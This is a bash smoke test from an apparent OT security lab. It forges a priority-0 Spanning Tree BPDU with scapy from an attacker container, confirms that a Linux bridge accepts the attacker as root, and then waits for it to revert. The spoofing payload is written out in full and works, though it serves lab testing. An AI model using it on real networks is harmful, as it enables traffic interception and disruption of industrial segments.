#!/usr/bin/env bash
# L2 surface probe. The clab fabric runs every zone bridge with STP on
# (stp_state=1, set by infrastructure/clab-up.sh). Bridge priority is the
# Linux default (32768) and no BPDU guard is configured: realistic for an
# OT segment commissioned with managed switches but never hardened. A
# visitor on any zone can send a superior BPDU and become root.
#
# Coverage:
#   Stage 0  STP is on for the target bridge (else skip, lab needs a redeploy)
#   Stage 1  bridge's current designated_root is its own bridge_id
#   Stage 2  superior BPDU from attacker rewrites the bridge's root record
#   Stage 3  designated_root reverts to self after max_age (no BPDU refresh)
#
# Usage: bash tests/smoke/test_stp_root_takeover.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ATTACKER="unseen-gate"
ATTACKER_IFACE="eth1"          # ics_internet NIC
BRIDGE="ics_internet"          # target host bridge

require_running "$ATTACKER"

echo "[stp] Stage 0: confirm STP is enabled on $BRIDGE"
STP_STATE="$(cat /sys/class/net/$BRIDGE/bridge/stp_state 2>/dev/null || echo missing)"
if [ "$STP_STATE" != "1" ]; then
    echo "  [skip] $BRIDGE has stp_state=$STP_STATE (need 1)."
    echo "         Run './ctl down && ./ctl up' (or 'sudo ip link set $BRIDGE type bridge stp_state 1') and retry."
    exit 2
fi
ok "$BRIDGE stp_state=1"

# Helper: read the bridge's designated_root from sysfs.
bridge_root() {
    cat "/sys/class/net/$BRIDGE/bridge/root_id" 2>/dev/null
}
bridge_own_id() {
    cat "/sys/class/net/$BRIDGE/bridge/bridge_id" 2>/dev/null
}

echo "[stp] Stage 1: $BRIDGE thinks it is the root"
SELF_ID="$(bridge_own_id)"
ROOT_BEFORE="$(bridge_root)"
[ -n "$SELF_ID" ]      || fail "could not read $BRIDGE bridge_id"
[ -n "$ROOT_BEFORE" ]  || fail "could not read $BRIDGE root_id"
assert_contains "$ROOT_BEFORE" "$SELF_ID" "designated_root matches bridge's own id"

echo "[stp] Stage 2: superior BPDU from attacker rewrites the root record"
ATTACKER_MAC="$(docker exec "$ATTACKER" sh -c "cat /sys/class/net/${ATTACKER_IFACE}/address" | tr -d '\r\n')"
[ -n "$ATTACKER_MAC" ] || fail "could not read attacker MAC"
# Send 3 superior BPDUs (priority 0, attacker's MAC). The bridge processes
# the first one it sees, designated_root flips immediately.
docker exec "$ATTACKER" /opt/attacker-env/bin/python3 -c "
from scapy.all import Dot3, LLC, STP, sendp
bpdu = Dot3(src='$ATTACKER_MAC', dst='01:80:c2:00:00:00') / \
       LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
       STP(proto=0, version=0, bpdutype=0, bpduflags=0,
           rootid=0, rootmac='$ATTACKER_MAC', pathcost=0,
           bridgeid=0, bridgemac='$ATTACKER_MAC',
           portid=0x8001, age=0, maxage=20, hellotime=2, fwddelay=15)
sendp(bpdu, iface='$ATTACKER_IFACE', count=5, inter=0.1, verbose=False)
" >/dev/null 2>&1 || fail "scapy BPDU send failed"
ROOT_DURING="$(bridge_root)"
# Linux formats root_id as "<priority-4hex>.<mac-12hex-no-colons>".
# Priority 0 prints as "0000."; attacker mac aa:c1:ab:07:53:99 prints as
# "aac1ab075399".
ATTACKER_MAC_FLAT="$(echo "$ATTACKER_MAC" | tr -d ':')"
assert_contains "$ROOT_DURING" "0000\." "root priority dropped to 0 (attacker is root)"
assert_contains "$ROOT_DURING" "$ATTACKER_MAC_FLAT" "root mac matches attacker"

echo "[stp] Stage 3: designated_root reverts to self after max_age"
# Without BPDU refresh, the spoofed root ages out after max_age (20s default).
# Bridge then re-elects itself. We poll for up to 30s so the test does not
# leave the bridge in an attacked state for the next run.
for _ in $(seq 1 30); do
    NOW="$(bridge_root)"
    [ "$NOW" = "$SELF_ID" ] && break
    sleep 1
done
assert_contains "$NOW" "$SELF_ID" "designated_root reverted to self after timeout"

summary
